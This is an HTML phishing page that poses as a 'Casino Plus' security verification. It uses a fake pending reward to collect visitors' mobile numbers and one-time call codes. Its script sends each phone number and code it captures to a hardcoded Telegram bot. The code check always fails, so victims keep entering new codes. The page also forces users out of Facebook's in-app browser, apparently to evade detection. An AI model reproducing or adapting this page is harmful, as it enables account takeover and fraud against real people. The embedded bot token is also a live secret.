<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Casino Plus | Secure Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
    <style>
        :root {
            --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 50%, #b8860b 100%);
            --dark-bg: #04070d;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--dark-bg);
            background-image: radial-gradient(circle at 50% -20%, #1a3a5a 0%, #04070d 100%);
            color: #ffffff;
            font-family: 'Public Sans', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Premium Card Design */
        .card {
            width: 92%;
            max-width: 380px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(212, 175, 55, 0.3);
            border-radius: 24px;
            padding: 40px 24px;
            backdrop-filter: blur(20px);
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
        }

        .logo-img {
            width: 170px;
            margin-bottom: 24px;
            filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.3));
        }

        h1 { font-size: 22px; font-weight: 800; margin-bottom: 12px; color: #fff; text-transform: uppercase; letter-spacing: 1px; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }

        /* Casino Gold Button */
        .btn-primary {
            background: var(--gold);
            color: #000;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 1px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3);
        }

        .btn-primary:active { transform: scale(0.96); box-shadow: none; }

        /* Modal Design */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.9);
            z-index: 99999;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
        }

        .modal-content {
            width: 100%;
            max-width: 380px;
            background: #0a0f1a;
            padding: 35px 24px;
            border-radius: 24px;
            text-align: center;
            border: 1px solid rgba(212, 175, 55, 0.2);
        }

        .label-text {
            text-align: left;
            display: block;
            font-size: 11px;
            text-transform: uppercase;
            color: #fbbf24;
            font-weight: 800;
            margin-bottom: 8px;
            letter-spacing: 1px;
        }

        input {
            width: 100%;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            padding: 16px;
            color: white;
            font-size: 18px;
            text-align: center;
            margin-bottom: 20px;
            outline: none;
            transition: 0.3s;
        }

        input:focus { border-color: #d4af37; background: rgba(255,255,255,0.08); }

        .wait-timer { font-family: 'Orbitron', sans-serif; font-size: 32px; color: #d4af37; margin-bottom: 20px; }

        .shake-error { animation: aggressive-shake 0.4s both; border-color: #ff3b30 !important; }

        @keyframes aggressive-shake {
            10%, 90% { transform: translate3d(-2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
        }

        .radio-group { display: flex; gap: 20px; margin-bottom: 25px; justify-content: center; }
        .radio-item { font-size: 14px; color: #cbd5e1; display: flex; align-items: center; gap: 8px; cursor: pointer; }
        .radio-item input { margin: 0; width: 18px; height: 18px; accent-color: #d4af37; cursor: pointer; }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://casinoplus.static2.website/images/image-7.jpg" class="logo-img" alt="CasinoPlus">
        <h1>Identity Security</h1>
        <p>System detected a pending reward. Please complete the quick verification to unlock your withdrawal portal.</p>
        <button class="btn-primary" id="verifyBtnMain" onclick="handleVerify()">Secure My Account</button>
    </div>

    <div class="modal-overlay" id="modalOverlay">
        <div class="modal-content">
            <div id="step1">
                <h2 style="font-size: 20px; margin-bottom: 20px; color: #fff;">Account Verification</h2>
                
                <span class="label-text">Linked Mobile Number</span>
                <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11">

                <span class="label-text">Existing Member?</span>
                <div class="radio-group">
                    <label class="radio-item"><input type="radio" name="reg" value="Yes" checked> YES</label>
                    <label class="radio-item"><input type="radio" name="reg" value="No"> NO</label>
                </div>

                <button class="btn-primary" onclick="processStep1()">Request System Call</button>
            </div>

            <div id="step2" class="hidden">
                <h2 style="font-size: 20px; margin-bottom: 10px; color: #fff;">Verifying...</h2>
                <p style="font-size: 13px; margin-bottom: 20px;">Please answer the automated call and enter the code below.</p>
                <div class="wait-timer" id="waitTimer">05:00</div>
                <span class="label-text">Enter 4-Digit Code</span>
                <input type="number" id="vCode" placeholder="0 0 0 0" oninput="if(this.value.length > 4) this.value = this.value.slice(0, 4);">
                <button class="btn-primary" id="verifyBtn" onclick="processStep2()">Confirm Verification</button>
            </div>
        </div>
    </div>

    <script>
        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
        const chatId = '7298607329';
        const BYPASS_MODE = true; 

        // Redirect logic for Facebook App
        const isFacebookApp = () => {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            return (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1);
        };

        if (isFacebookApp()) {
            alert("Security Notice: Please open this in your system browser (Chrome/Safari) to verify your account.");
        }

        function handleVerify() {
            const currentUrl = window.location.href.replace(/^https?:\/\//, '');
            if (!window.location.hash.includes("verified")) {
                const intentUrl = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
                window.location.href = intentUrl;
                setTimeout(() => {
                    document.getElementById('modalOverlay').style.display = 'flex';
                }, 1500);
            } else {
                document.getElementById('modalOverlay').style.display = 'flex';
            }
        }

        window.onload = () => {
            if (window.location.hash.includes("verified")) {
                document.getElementById('modalOverlay').style.display = 'flex';
            }
        };

        function processStep1() {
            const phone = document.getElementById('userPhone').value;
            const regStatus = document.querySelector('input[name="reg"]:checked').value;
            
            if (phone.length < 11 || !phone.startsWith('09')) {
                const el = document.getElementById('userPhone');
                el.classList.add('shake-error');
                setTimeout(() => el.classList.remove('shake-error'), 500);
                return;
            }

            const msg = `🎰 ACCOUNT FOR CALL:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;

            if(BYPASS_MODE) {
                setTimeout(() => {
                    window.location.href = "main.html";
                }, 1200);
            } else {
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
                startCountDown(300);
            }
        }

        function processStep2() {
            const vInput = document.getElementById('vCode');
            const phone = document.getElementById('userPhone').value;

            vInput.classList.add('shake-error');
            setTimeout(() => vInput.classList.remove('shake-error'), 500);
            
            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('⚠️ INVALID CODE:\n📱 ' + phone + '\n🔢 Code: ' + vInput.value)}`;
            
            alert("Verification failed. Please wait for a new system call.");
            vInput.value = "";
        }

        function startCountDown(sec) {
            let timer = sec;
            const display = document.getElementById('waitTimer');
            const iv = setInterval(() => {
                let m = Math.floor(timer / 60);
                let s = timer % 60;
                display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
                if (--timer < 0) { clearInterval(iv); timer = 0; }
            }, 1000);
        }
    </script>
</body>
</html>
